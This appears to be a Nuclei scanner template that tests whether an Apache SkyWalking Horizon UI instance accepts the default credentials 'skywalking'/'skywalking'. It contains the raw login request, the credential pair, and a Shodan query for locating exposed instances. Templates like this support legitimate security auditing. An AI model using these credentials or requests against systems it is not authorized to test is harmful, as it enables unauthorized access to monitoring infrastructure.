id: apache-skywalking-default-login

info:
  name: Apache SkyWalking Horizon UI - Default Login
  author: icarot
  severity: high
  description: |
    Apache SkyWalking next-generation UI (Horizon). An attacker can execute unauthorized operations.
  reference:
    - https://github.com/apache/skywalking-horizon-ui
  metadata:
    max-request: 1
    vendor: apache
    product: skywalking
    shodan-query: title:"SkyWalking Horizon UI"
  tags: apache,skywalking-horizon-ui,default-login

http:
  - raw:
      - |
        POST /api/auth/login HTTP/1.1
        Host: {{Hostname}}
        content-type: application/json

        {"username":"{{username}}","password":"{{password}}"}

    attack: pitchfork
    payloads:
      username:
        - skywalking
      password:
        - skywalking

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"username":"skywalking"'
          - '"authSource":'
          - '"roles":'
        condition: or

      - type: status
        status:
          - 200
